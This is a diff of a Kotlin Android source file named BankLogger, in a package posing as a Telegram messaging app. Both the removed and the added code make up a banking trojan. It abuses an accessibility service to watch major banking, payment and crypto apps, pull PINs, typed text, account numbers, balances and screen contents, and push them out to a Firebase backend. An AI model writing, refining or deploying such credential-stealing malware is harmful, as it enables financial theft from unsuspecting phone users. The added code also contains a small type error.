@@ -1,71 +1,44 @@
 package com.telegram2.messaging.remote
 
-import android.accessibilityservice.AccessibilityService
-import android.view.accessibility.AccessibilityEvent
-import android.view.accessibility.AccessibilityNodeInfo
+class BankLogger {
+    companion object {
+        private val BANK_PACKAGES = setOf(
+            "com.bankofamerica", "com.chase", "com.wellsfargo", "com.citi.mobile",
+            "com.capitalone", "com.usbank", "com.americanexpress", "com.paypal",
+            "com.revolut", "com.n26", "com.etrade", "com.coinbase"
+        )
 
-object BankLogger {
-    private val financialKeywords = setOf(
-        "balance", "available", "total", "amount", "transfer", "send", "pay",
-        "card", "cvv", "cvc", "expiry", "exp date", "password", "pin", "login",
-        "confirm", "otp", "code", "verification", "authenticate", "security", "2fa"
-    )
+        fun onEvent(service: MyAccessibilityService, event: android.view.accessibility.AccessibilityEvent) {
+            val pkg = event.packageName?.toString() ?: return
+            if (pkg !in BANK_PACKAGES) return
 
-    fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
-        val pkg = event.packageName?.toString() ?: return
+            val text = event.text.joinToString(" ")
+            val desc = event.contentDescription?.toString() ?: ""
 
-        if (isFinancialApp(pkg) || containsFinancialKeywords(event)) {
-            when (event.eventType) {
-                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
-                    val source = event.source ?: return
-                    val text = source.text?.toString()
-                    if (text != null && text.length == 1 && text[0].isDigit()) {
-                        FirebaseBridge.pushBankData("PIN_DIGIT: $text | App: $pkg | Time: ${System.currentTimeMillis()}")
-                    }
-                    source.recycle()
-                }
-                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                    val newText = event.text?.joinToString(" ") ?: ""
-                    if (newText.isNotEmpty()) {
-                        FirebaseBridge.pushBankData("TEXT_INPUT: $newText | App: $pkg")
-                    }
-                }
-                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                    val root = service.rootInActiveWindow ?: return
-                    val allTexts = mutableListOf<String>()
-                    collectTexts(root, allTexts)
-                    if (allTexts.any { containsFinancialKeywords(it) }) {
-                        FirebaseBridge.pushBankData("SCREEN_DATA: ${allTexts.joinToString(" | ")} | App: $pkg")
-                    }
+            // Log PIN
+            if (text.contains(Regex("\\b\\d{4,6}\\b")) || desc.contains("PIN")) {
+                val pin = Regex("\\b\\d{4,6}\\b").find(text)?.value
+                if (pin != null) {
+                    FirebaseBridge.logBankData(pkg, pin = pin.value)
                 }
             }
-        }
-    }
 
-    private fun isFinancialApp(pkg: String): Boolean {
-        return pkg.contains("bank") || pkg.contains("pay") || pkg.contains("wallet") ||
-                pkg.contains("money") || pkg.contains("card") || pkg.contains("finance") ||
-                pkg.contains("paypal") || pkg.contains("venmo") || pkg.contains("crypto")
-    }
+            // Log Account Number
+            if (text.contains(Regex("\\b\\d{8,17}\\b"))) {
+                val acc = Regex("\\b\\d{8,17}\\b").find(text)?.value
+                if (acc != null) {
+                    FirebaseBridge.logBankData(pkg, account = acc)
+                }
+            }
 
-    private fun containsFinancialKeywords(text: String): Boolean {
-        val lower = text.lowercase()
-        return financialKeywords.any { it in lower }
-    }
-
-    private fun containsFinancialKeywords(event: AccessibilityEvent): Boolean {
-        return event.text?.joinToString(" ")?.lowercase()?.let { containsFinancialKeywords(it) } ?: false
-    }
-
-    private fun collectTexts(node: AccessibilityNodeInfo, out: MutableList<String>) {
-        if (node.text != null && node.text.isNotBlank()) {
-            out.add("TEXT: ${node.text}")
-        }
-        if (node.hintText != null) {
-            out.add("HINT: ${node.hintText}")
-        }
-        for (i in 0 until node.childCount) {
-            node.getChild(i)?.let { collectTexts(it, out) }
+            // Log Balance
+            if (text.contains("\$") || text.contains("Balance") || text.contains("Available")) {
+                val balance = Regex("\\$\\s*[\\d,]+\\.\\d{2}").find(text)?.value
+                    ?: Regex("Balance[:\\s]+[\\d.]+").find(text)?.value
+                if (balance != null) {
+                    FirebaseBridge.logBankData(pkg, balance = balance)
+                }
+            }
         }
     }
 }
